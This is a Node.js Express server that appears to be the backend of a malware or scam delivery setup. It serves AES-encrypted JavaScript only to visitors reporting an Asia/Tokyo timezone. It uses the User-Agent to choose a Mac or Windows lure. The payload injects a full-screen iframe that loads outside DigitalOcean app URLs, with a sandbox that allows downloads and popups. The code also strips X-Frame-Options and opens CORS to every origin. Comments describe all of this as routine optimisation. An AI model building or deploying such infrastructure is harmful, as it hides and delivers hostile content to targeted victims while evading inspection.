const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// --- Middleware ---
app.use(cors());
app.use(express.json());

// Optimized Security Headers Middleware
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, User-Agent");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    if (res.getHeader('X-Frame-Options') === 'sameorigin') {
        res.removeHeader('X-Frame-Options');
    }
    next();
});

// --- Static Data Configurations ---

// O(1) Instant Lookup Set
const ALLOWED_TIMEZONES = new Set([
   "Asia/Tokyo"
]);

// Destination Links
const LINK_MAC = "https://seal-app-mfxsx.ondigitalocean.app/Ma0cHelpAsMEr0t0140";
const LINK_OTHERS = "https://seal-app-mfxsx.ondigitalocean.app/Win0codejInfowj2n";

// --- Pre-Compilation Cache Layer ---
// Helper to generate identical iframe payloads dynamically on boot
const buildIframePayload = (url) => `const iframe=document.createElement("iframe");iframe.src="${url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;

// Pre-encrypt static variations during startup
const ENCRYPTED_MAC_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(buildIframePayload(LINK_MAC), secretKey).toString());
const ENCRYPTED_OTHERS_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(buildIframePayload(LINK_OTHERS), secretKey).toString());
const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());

// --- Routes ---

app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "Unauthorized access",
        response: ERROR_PAYLOAD
    });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;

    // 1. Validate timezone via O(1) memory Set
    if (!timezone || !ALLOWED_TIMEZONES.has(timezone)) {
        return res.send(ERROR_PAYLOAD);
    }

    // 2. Sniff Operating System using User-Agent header
    const userAgent = req.headers["user-agent"] || "";
    const isMac = /Macintosh|Mac OS X/i.test(userAgent);

    // 3. Serve the respective pre-encrypted payload instantly
    if (isMac) {
        res.send(ENCRYPTED_MAC_PAYLOAD);
    } else {
        res.send(ENCRYPTED_OTHERS_PAYLOAD);
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`High-performance OS-targeted server running on port ${PORT}`);
});
